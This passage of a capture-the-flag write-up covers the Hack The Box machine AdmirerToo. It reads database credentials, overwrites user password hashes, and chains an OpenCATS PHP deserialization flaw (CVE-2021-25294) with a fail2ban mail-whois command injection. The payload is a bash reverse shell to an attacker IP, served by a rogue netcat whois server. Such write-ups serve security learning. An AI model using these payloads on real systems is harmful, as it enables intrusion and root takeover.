individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Feb 22 20:58:38 2022 from 10.10.14.8
jennifer@admirertoo:~<span class="err">$</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/AdmirerToo/Untitled%2012.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%2012.png" alt="Untitled" loading="lazy"></a></p>

<p>Enumerated configuration file for DB credentials:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:/opt/opencats<span class="nv">$ </span><span class="nb">cat </span>config.php | <span class="nb">grep</span> <span class="nt">-i</span> database
/<span class="k">*</span> Database configuration. <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DATABASE_USER'</span>, <span class="s1">'cats'</span><span class="o">)</span><span class="p">;</span>
define<span class="o">(</span><span class="s1">'DATABASE_PASS'</span>, <span class="s1">'adm1r3r0fc4ts'</span><span class="o">)</span><span class="p">;</span>
define<span class="o">(</span><span class="s1">'DATABASE_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
define<span class="o">(</span><span class="s1">'DATABASE_NAME'</span>, <span class="s1">'cats_dev'</span><span class="o">)</span><span class="p">;</span>
 <span class="k">*</span> core team. If this setting is enabled, no writing to the database will
/<span class="k">*</span> If enabled, the US zipcode database is installed and the user can filter
</pre></td></tr></tbody></table></code></div></div>

<aside>
üîë cats     adm1r3r0fc4ts

</aside>

<p>Enumerated DB data:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:/opt/opencats<span class="nv">$ </span>mysql <span class="nt">-u</span> cats <span class="nt">-p</span>
Enter password: 
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 134652
Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> ...
MariaDB <span class="o">[</span>cats_dev]&gt; show tables<span class="p">;</span>
+--------------------------------------+
| Tables_in_cats_dev                   |
+--------------------------------------+
| access_level                         |
| activity                             |
| activity_type                        |
...
| tag                                  |
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
55 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>

MariaDB <span class="o">[</span>cats_dev]&gt; <span class="k">select </span>user_name,password from user<span class="p">;</span>
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | dfa2a420a4e48de6fe481c90e295fe97 |
| cats@rootadmin | cantlogin                        |
| jennifer       | f59f297aa82171cc860d76c390ce7f3e |
+----------------+----------------------------------+
3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated user privileges ni MySQL:</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="err">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="err">cats_dev</span><span class="p">]</span><span class="err">&gt;</span><span class="w"> </span><span class="err">show</span><span class="w"> </span><span class="err">grants;</span><span class="w">
</span><span class="err">+-------------------------------------------------------------------------------------------------------------+</span><span class="w">
</span><span class="err">|</span><span class="w"> </span><span class="err">Grants</span><span class="w"> </span><span class="err">for</span><span class="w"> </span><span class="err">cats@localhost</span><span class="w">                                                                                   </span><span class="err">|</span><span class="w">
</span><span class="err">+-------------------------------------------------------------------------------------------------------------+</span><span class="w">
</span><span class="err">|</span><span class="w"> </span><span class="err">GRANT</span><span class="w"> </span><span class="err">USAGE</span><span class="w"> </span><span class="err">ON</span><span class="w"> </span><span class="err">*.*</span><span class="w"> </span><span class="err">TO</span><span class="w"> </span><span class="err">`cats`@`localhost`</span><span class="w"> </span><span class="err">IDENTIFIED</span><span class="w"> </span><span class="err">BY</span><span class="w"> </span><span class="err">PASSWORD</span><span class="w"> </span><span class="err">'*</span><span class="mi">6</span><span class="err">DB</span><span class="mi">7</span><span class="err">C</span><span class="mi">7</span><span class="err">C</span><span class="mi">159</span><span class="err">FC</span><span class="mi">2393785</span><span class="err">B</span><span class="mi">54064E70</span><span class="err">FDB</span><span class="mi">137</span><span class="err">F</span><span class="mi">445</span><span class="err">B</span><span class="mi">9</span><span class="err">'</span><span class="w"> </span><span class="err">|</span><span class="w">
</span><span class="err">|</span><span class="w"> </span><span class="err">GRANT</span><span class="w"> </span><span class="err">ALL</span><span class="w"> </span><span class="err">PRIVILEGES</span><span class="w"> </span><span class="err">ON</span><span class="w"> </span><span class="err">`cats_dev`.*</span><span class="w"> </span><span class="err">TO</span><span class="w"> </span><span class="err">`cats`@`localhost`</span><span class="w">                                                  </span><span class="err">|</span><span class="w">
</span><span class="err">+-------------------------------------------------------------------------------------------------------------+</span><span class="w">
</span><span class="mi">2</span><span class="w"> </span><span class="err">rows</span><span class="w"> </span><span class="err">in</span><span class="w"> </span><span class="err">set</span><span class="w"> </span><span class="err">(</span><span class="mf">0.000</span><span class="w"> </span><span class="err">sec)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Updated every password (cracking hashes was not working):</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/CTFs/HTB/B2R/AdmirerToo]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> maoutis | <span class="nb">md5sum
</span>6f2ae4978075eae54f9491744818d28d  -
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>MariaDB <span class="o">[</span>cats_dev]&gt; update user <span class="nb">set </span><span class="nv">password</span><span class="o">=</span><span class="s2">"6f2ae4978075eae54f9491744818d28d"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Logged in to opencats using self injected credentials:</p>

<p><a href="/assets/img/AdmirerToo/Untitled%2013.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%2013.png" alt="Untitled" loading="lazy"></a></p>

<h4 id="enumerated-other-services"><span class="me-2">Enumerated other services</span><a href="#enumerated-other-services" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:/opt/opencats<span class="nv">$ </span>systemctl list-units <span class="nt">--type</span><span class="o">=</span>service
UNIT                               LOAD   ACTIVE SUB     DESCRIPTION
apache2.service                    loaded active running The Apache HTTP Server
apache2@opencats.service           loaded active running The Apache HTTP Server
apparmor.service                   loaded active exited  Load AppArmor profiles
console-setup.service              loaded active exited  Set console font and keymap
cron.service                       loaded active running Regular background program processing daemon
dbus.service                       loaded active running D-Bus System Message Bus
fail2ban.service                   loaded active running Fail2Ban Service
getty@tty1.service                 loaded active running Getty on tty1
hbase.service                      loaded active running HBase
ifup@eth0.service                  loaded active exited  ifup <span class="k">for </span>eth0
ifupdown-pre.service               loaded active exited  Helper to synchronize boot up <span class="k">for </span>ifupdown
keyboard-setup.service             loaded active exited  Set the console keyboard layout
kmod-static-nodes.service          loaded active exited  Create list of required static device nodes <span class="k">for </span>the curren
mariadb.service                    loaded active running MariaDB 10.3.31 database server
networking.service                 loaded active exited  Raise network interfaces
nftables.service                   loaded active exited  nftables
open-vm-tools.service              loaded active running Service <span class="k">for </span>virtual machines hosted on VMware
opentsdb.service                   loaded active running LSB: Starts OpenTSDB TSD
php7.3-fpm.service                 loaded active running The PHP 7.3 FastCGI Process Manager
rsyslog.service                    loaded active running System Logging Service
ssh.service                        loaded active running OpenBSD Secure Shell server
systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage
systemd-journald.service           loaded active running Journal Service
systemd-logind.service             loaded active running Login Service
systemd-modules-load.service       loaded active exited  Load Kernel Modules
systemd-random-seed.service        loaded active exited  Load/Save Random Seed
systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems
systemd-sysctl.service             loaded active exited  Apply Kernel Variables
systemd-sysusers.service           loaded active exited  Create System Users
systemd-timesyncd.service          loaded active running Network Time Synchronization
systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes <span class="k">in</span> /dev
systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories
systemd-udev-trigger.service       loaded active exited  udev Coldplug all Devices
systemd-udevd.service              loaded active running udev Kernel Device Manager
systemd-update-utmp.service        loaded active exited  Update UTMP about System Boot/Shutdown
systemd-user-sessions.service      loaded active exited  Permit User Sessions
user-runtime-dir@1002.service      loaded active exited  User Runtime Directory /run/user/1002
user@1002.service                  loaded active running User Manager <span class="k">for </span>UID 1002
vgauth.service                     loaded active running Authentication service <span class="k">for </span>virtual machines hosted on VMwa

LOAD   <span class="o">=</span> Reflects whether the unit definition was properly loaded.
ACTIVE <span class="o">=</span> The high-level unit activation state, i.e. generalization of SUB.
SUB    <span class="o">=</span> The low-level unit activation state, values depend on unit type.

39 loaded units listed. Pass <span class="nt">--all</span> to see loaded but inactive units, too.
To show all installed unit files use <span class="s1">'systemctl list-unit-files'</span><span class="nb">.</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated fail2ban:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:/opt/opencats<span class="nv">$ </span>fail2ban-server <span class="nt">-V</span>
Fail2Ban v0.10.2

jennifer@admirertoo:/opt/opencats<span class="nv">$ </span><span class="nb">cat</span> /etc/fail2ban/jail.local
<span class="o">[</span>DEFAULT]
ignoreip <span class="o">=</span> 127.0.0.1
bantime <span class="o">=</span> 60s
destemail <span class="o">=</span> root@admirertoo.htb
sender <span class="o">=</span> fail2ban@admirertoo.htb
sendername <span class="o">=</span> Fail2ban
mta <span class="o">=</span> mail
action <span class="o">=</span> %<span class="o">(</span>action_mwl<span class="o">)</span>s
</pre></td></tr></tbody></table></code></div></div>

<h3 id="opencats-php-object-injection-to-arbitrary-file-write---cve-2021-25294"><span class="me-2">OpenCATS PHP Object Injection to Arbitrary File Write - CVE-2021-25294</span><a href="#opencats-php-object-injection-to-arbitrary-file-write---cve-2021-25294" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>OpenCATS Version 0.9.5.2</p>

<p><a href="https://www.cvedetails.com/cve/CVE-2021-25294/">CVE-2021-25294 : OpenCATS through 0.9.5-3 unsafely deserializes index.php?m=activity requests, leading to remote code execution. This occ</a></p>

<p><a href="https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html">OpenCATS PHP Object Injection to Arbitrary File Write</a></p>

<p>Generated the POP gadget like the PoC does:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'this is a test'</span> <span class="o">&gt;</span> /tmp/test.txt

‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span>phpggc <span class="nt">-u</span> <span class="nt">--fast-destruct</span> Guzzle/FW1 /dev/shm/test.txt /tmp/test.txt
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A15%3A%22this+is+a+test%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Ftest.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/AdmirerToo/Untitled%2014.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%2014.png" alt="Untitled" loading="lazy"></a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:/opt/opencats<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /dev/shm/test.txt 
<span class="nt">-rw-r--r--</span> 1 devel devel 58 Apr 24 20:19 /dev/shm/test.txt
jennifer@admirertoo:/opt/opencats<span class="nv">$ </span><span class="nb">cat</span> /dev/shm/test.txt 
<span class="o">[{</span><span class="s2">"Expires"</span>:1,<span class="s2">"Discard"</span>:false,<span class="s2">"Value"</span>:<span class="s2">"this is a test</span><span class="se">\n</span><span class="s2">"</span><span class="o">}]</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated devel group writable directories:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:~/test<span class="nv">$ </span>find / <span class="nt">-group</span> devel 2&gt;/dev/null
/opt/opencats/INSTALL_BLOCK
/usr/local/src
/usr/local/etc
jennifer@admirertoo:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /usr/local/src/                                                                                                                                                                                            
total 8                                                                                                                                                                                                                                     
drwxrwxr-x  2 root devel 4096 Jul  7  2021 <span class="nb">.</span>                                                                                                                                                                                                
drwxr-xr-x 10 root root  4096 Jul  7  2021 ..
</pre></td></tr></tbody></table></code></div></div>

<h3 id="rce-vulnerability-in-mailing-action-using-mailutils-mail-whois"><span class="me-2">RCE vulnerability in mailing action using mailutils (mail-whois)</span><a href="#rce-vulnerability-in-mailing-action-using-mailutils-mail-whois" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><a href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm">Build software better, together</a></p>

<blockquote>
  <p>Command¬†<code class="language-plaintext highlighter-rouge">mail</code>¬†from mailutils package used in mail actions like¬†<code class="language-plaintext highlighter-rouge">mail-whois</code>¬†can execute command if unescaped sequences (<code class="language-plaintext highlighter-rouge">\n~</code>) are available in ‚Äúforeign‚Äù input (for instance in whois output).
[‚Ä¶]
<em>The ‚Äò~!‚Äô escape executes specified command and returns you to mail compose mode without altering your message. When used without arguments, it starts your login shell. The ‚Äò~|‚Äô escape pipes the message composed so far through the given shell command and replaces the message with the output the command produced. If the command produced no output, mail assumes that something went wrong and retains the old contents of your message.</em>
[‚Ä¶]
<strong>Which menas that as long as attacker can control stdin that goes to mail (from mailutils package) command - code execution could be achieved. 
Then - the interesting configuration file from fail2ban perspective is <code class="language-plaintext highlighter-rouge">/etc/fail2ban/action.d/mail-whois.conf</code> fragment:
[‚Ä¶]
This strictly puts whois command output of banned IP address into email. So if attacker could **get control over whois output of his own IP</strong> address - code execution could be achieved (with root, which is more fun of course).</p>

</blockquote>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:/opt/opencats<span class="nv">$ </span><span class="nb">cat</span> /etc/fail2ban/action.d/mail-whois.conf
...
actionban <span class="o">=</span> <span class="nb">printf</span> %%b <span class="s2">"Hi,</span><span class="se">\n</span><span class="s2">
            The IP &lt;ip&gt; has just been banned by Fail2Ban after
            &lt;failures&gt; attempts against &lt;name&gt;.</span><span class="se">\n\n</span><span class="s2">
            Here is more information about &lt;ip&gt; :</span><span class="se">\n</span><span class="s2">
            </span><span class="sb">`</span>%<span class="o">(</span>_whois_command<span class="o">)</span>s<span class="sb">`</span><span class="se">\n</span><span class="s2">
            Regards,</span><span class="se">\n</span><span class="s2">
            Fail2Ban"</span>|mail <span class="nt">-s</span> <span class="s2">"[Fail2Ban] &lt;name&gt;: banned &lt;ip&gt; from &lt;fq-hostname&gt;"</span> &lt;dest&gt;
...
</pre></td></tr></tbody></table></code></div></div>

<p>To exploit the vulnerability we must have control on whois output. Luckly <strong>opencats</strong> run with devel privileges and is vulnerable to PHP Object Injectionm leading to arbitrary file write. Devel has write privileges on <code class="language-plaintext highlighter-rouge">/usr/local/etc</code>, a secondary directory for configuration files, and so he can write here an arbitrary <strong>whois.conf</strong> that can be used to exploit the RCE in fail2ban</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:/opt/opencats<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /usr/local/etc
drwxrwxr-x 2 root devel 4096 Jul  7  2021 /usr/local/etc
</pre></td></tr></tbody></table></code></div></div>

<p>Because the PHP deserialization writes json, we need to craft a specific POP gadget to write a clean conf file:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/CTFs/HTB/B2R/AdmirerToo]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'}]|. [10.10.14.2]'</span> <span class="o">&gt;</span> /tmp/payload

‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/CTFs/HTB/B2R/AdmirerToo]
‚îî‚îÄ<span class="nv">$ </span>phpggc <span class="nt">-u</span> <span class="nt">--fast-destruct</span> Guzzle/FW1 /usr/local/etc/whois.conf /tmp/payload
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.18%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
</pre></td></tr></tbody></table></code></div></div>

<p>Exploited the PHP Object Injection and wrote the conf file:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.18%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: CATS=rsiut3ufujk9etpjqesshnchfr
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:~<span class="nv">$ </span><span class="nb">ls</span> /usr/local/etc/
jennifer@admirertoo:~<span class="nv">$ </span><span class="nb">ls</span> /usr/local/etc/
whois.conf
jennifer@admirertoo:~<span class="nv">$ </span><span class="nb">cat</span> /usr/local/etc/whois.conf
<span class="o">[{</span><span class="s2">"Expires"</span>:1,<span class="s2">"Discard"</span>:false,<span class="s2">"Value"</span>:<span class="s2">"}]|. [10.10.14.2]</span><span class="se">\n</span><span class="s2">"</span><span class="o">}]</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Preparing and testing the WHOIS rogue server:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'~| bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.2/10099 0&gt;&amp;1" &amp;'</span> <span class="o">&gt;</span> fail2ban-rev.sh

‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nvlkp</span> 43 <span class="nt">-c</span> <span class="s2">"cat fail2ban-rev.sh"</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali:
listening on <span class="o">[</span>any] 43 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.137] 52964
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>jennifer@admirertoo:~<span class="nv">$ </span>whois 10.10.14.2
~| bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.14.2/10099 0&gt;&amp;1"</span> &amp;
fgets: Connection reset by peer
</pre></td></tr></tbody></table></code></div></div>

<p>Now we can force fail2ban into banning our IP in order to send an email to root (with root privileges) containing out malicious payload and obtaining RCE.</p>

<p>Rogue WHOIS server:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
